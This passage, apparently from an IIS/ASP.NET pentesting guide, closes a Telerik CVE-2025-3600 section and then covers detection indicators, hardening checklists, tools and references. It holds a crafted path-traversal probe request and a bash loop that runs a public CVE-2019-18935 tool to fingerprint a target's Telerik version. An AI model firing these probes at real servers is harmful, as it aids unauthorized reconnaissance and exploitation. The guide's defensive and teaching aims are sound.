GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=watchTowr.poc,+../../../../../../../../../watchTowr
```

### 6.1.7 Version Triage via Legacy RAU Handler

If `type=rau` is also reachable, use classic Telerik RAU tooling to fingerprint the `Telerik.Web.UI.dll` version before attempting `type=iec` research:

```bash
for YEAR in $(seq 2011 2025); do
  echo -n "$YEAR: "
  python3 CVE-2019-18935.py -t -v "$YEAR" -p /dev/null \
    -u 'https://target/Telerik.Web.UI.WebResource.axd?type=rau' 2>/dev/null |
    grep -oE "Telerik.Web.UI, Version=$YEAR\\.[0-9\\.]+" || echo
done
```

> **Note:** `type=rau` absence is **inconclusive**. `iec` may still be exposed even when `rau` is disabled or filtered.

### 6.1.8 Mitigation

- Patch to Telerik UI for ASP.NET AJAX **2025.1.416** or later
- Remove or restrict exposure of `Telerik.Web.UI.WebResource.axd` via WAF/rewrites
- Audit and harden custom `AppDomain.AssemblyResolve` handlers — avoid building paths from `args.Name` without sanitization
- Constrain upload/write locations; prevent DLL drops into probed directories
- Monitor for non-existent type load attempts to catch resolver abuse

> **Full analysis:**
> - [Telerik KB — Unsafe Reflection Vulnerability (CVE-2025-3600)](https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/kb-security-unsafe-reflection-cve-2025-3600)
> - [watchTowr Labs — More than DoS: CVE-2025-3600](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
> - [watchTowr — Pre-Auth RCE Chain in Sitecore (CVE-2025-34509)](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)

---

# 0x07 Defense, Hardening & Detection

## 7.1 Detection Methodology

### 7.1.1 Network Telemetry

| Indicator | Source | Significance |
|-----------|--------|--------------|
| Requests to `trace.axd`, `Telerik.Web.UI.WebResource.axd` | Web server logs | Known vulnerable endpoints |
| `type=iec` and odd `prtype` values | Query parameters | CVE-2025-3600 exploitation attempt |
| `~*` in URL path | Request path | Short filename enumeration |
| HTTP/1.0 requests without `Host` header | Request line | Internal IP disclosure probing |
| `/:$i30:$INDEX_ALLOCATION/` in URL | Request path | IIS 7.5 Basic auth bypass attempt |
| `.config` file uploads | Content-Disposition | Web.config code execution attempt |
| Failed type loads + `AppDomain.AssemblyResolve` events | ETW/.NET runtime | Telerik resolver abuse |

### 7.1.2 Host-Based Indicators

| Indicator | Location | Significance |
|-----------|----------|--------------|
| New `.aspx` files in `wwwroot` not matching deployment timeline | Filesystem | Webshell drop |
| ASPX files with large Base64/Gzip blobs | File content analysis | NET-STAR bootstrapper |
| `Assembly.Load(byte[])` from unusual call stacks | .NET profiling / ETW | Reflective loading |
| Strings `Encrypt/Decrypt` (ECB mode), `Compress/Decompress`, `GetContext` | Memory strings in `w3wp.exe` | NET-STAR operator code |
| Repeated `"STAR"` delimiter in cookie values | Network traffic / IIS logs | NET-STAR C2 channel |
| Mismatched or future timestamps on ASPX files | Filesystem metadata | Timestomping |
| Unbacked managed modules in `w3wp.exe` | `!dumpdomain` in WinDbg/SOS | In-memory-only assemblies |

## 7.2 IIS Hardening Checklist

### 7.2.1 Configuration Hardening

| Action | Rationale |
|--------|-----------|
| Remove/unlock `trace.axd` in production (`<trace enabled="false"/>`) | Prevents detailed request log exposure |
| Remove default/misconfigured handler mappings (`.cer`, `.cdx` → ASP) | Closes legacy parsing bypasses |
| Lock down `Telerik.Web.UI.WebResource.axd` or upgrade to ≥2025.1.416 | Mitigates CVE-2025-3600 |
| Set `cgi.fix_pathinfo=0` for PHP FastCGI | Prevents `/.php` appended execution |
| Ensure `Invoke handler only if request is mapped to` is checked for PHP | Prevents CGI handler bypass |
| Remove IISADMPWD virtual directory (IIS 4.0/5.0 legacy) | Removes password management exposure |
| Remove FrontPage Server Extensions (`_vti_*`) if not needed | Removes legacy attack surface |
| Disable WebDAV if not required | Closes IIS 6.0 WebDAV parsing bugs and PROPFIND/PROPPATCH enumeration |
| Remove default samples (`/iissamples/`, `/scripts/samples/`) | Removes known-vulnerable sample code |
| Set `<httpRuntime targetFramework="..." requestValidationMode="4.0"/>` | Enables request validation in ASP.NET 4.0+ |

### 7.2.2 Key Management

| Action | Rationale |
|--------|-----------|
| Replace default `machineKey` values with generated unique keys | Prevents ASPXAUTH cross-app cookie reuse |
| Store Data Protection key rings outside webroot (use `%PROGRAMDATA%` or Azure Key Vault) | Prevents trivial offline decryption |
| Use DPAPI with user-scoped protection rather than machine-scoped for sensitive config | Limits decryption to the application pool identity |
| Encrypt `connectionStrings` and `appSettings` sections in `web.config` | Protects database credentials at rest |

### 7.2.3 Filesystem & App Pool

| Action | Rationale |
|--------|-----------|
| Ensure `C:\inetpub\wwwroot` does NOT have write permission for low-privileged users/groups | Prevents ASPX webshell drops |
| Run each application in a dedicated App Pool with least-privilege identity | Limits lateral movement between applications |
| Remove `SeImpersonatePrivilege` from App Pool identities where not needed | Blocks Potato-family LPE from AppPool → SYSTEM |
| Use `ApplicationPoolIdentity` (virtual account) rather than `NetworkService` | More restrictive default permissions |
| Enable IIS Request Filtering — deny `.config`, `.asax`, `.cs`, `.vb` extensions | Prevents sensitive file download and web.config upload |
| Set `maxAllowedContentLength` and `maxQueryString` limits | Mitigates oversized request attacks |

### 7.2.4 Monitoring & Response

| Action | Rationale |
|---------|-----------|
| Enable Advanced Logging with full URI, query string, cookies, and `Host` header | Visibility into all attack vectors |
| Forward IIS logs to SIEM with alerting on the indicators in §7.1 | Real-time detection |
| Use ETW tracing for .NET AssemblyLoad events | Detects reflective loading |
| Enable AppLocker / WDAC to restrict DLL loading from writable directories | Prevents Telerik resolver abuse chains |
| Run periodic `icacls C:\inetpub\wwwroot` audits | Detect permission drift |
| Keep IIS and .NET runtimes patched (Windows Update) | Address HTTP.sys and framework-level vulnerabilities |

## 7.3 Tools Inventory

| Tool | Purpose | Reference |
|------|---------|-----------|
| `iis_shortname_scanner.jar` | Tilde short filename enumeration | [github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) |
| Metasploit `iis_shortname_scanner` | Integrated scanning | `use scanner/http/iis_shortname_scanner` |
| `brainstorm/fuzzer_shortname.py` | LLM-based shortname completion | [github.com/Invicti-Security/brainstorm](https://github.com/Invicti-Security/brainstorm) |
| `iisfinal.txt` | IIS directory/file bruteforce wordlist | Hacktricks compiled list |
| `icacls` / `cacls` | NTFS permission audit | Built-in Windows |
| `aspnet_regiis.exe` | Configuration encryption/decryption | .NET Framework SDK |
| `dnSpy` / `ILSpy` / `dotPeek` | .NET DLL decompilation | Third-party |
| CVE-2019-18935.py | Telerik RAU version brute force | Legacy Telerik PoC |
| WinDbg + SOS (`!dumpdomain`) | In-memory assembly enumeration | Windows SDK |

## 参考资料

- [HackTricks — IIS Internet Information Services](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services)
- [Orange Tsai — CVE-2022-30209: Let's Dance in the Cache (2022)](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)
- [MindedSecurity — From Path Traversal to Source Code in .NET (2018)](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)
- [Soroush SecProject — Microsoft IIS Tilde Character Vulnerability (PDF)](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)
- [Soroush SecProject — Upload a Web.config File for Fun & Profit (2014)](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
- [Unit 42 — Phantom Taurus: NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [watchTowr Labs — More than DoS: CVE-2025-3600 (2025)](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [watchTowr — Pre-Auth RCE Chain in Sitecore CVE-2025-34509 (2025)](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)
- [Telerik KB — Unsafe Reflection CVE-2025-3600](https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/kb-security-unsafe-reflection-cve-2025-3600)
- [Rapid7 — ASP.NET Trace.AXD](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)
- [0xdf — HTB Job: IIS Write → ASPX Shell → GodPotato (2026)](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [PayloadsAllTheThings — IIS web.config Upload Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
- [Absolomb — Windows Privilege Escalation Guide (2018)](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [SecLists — IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)
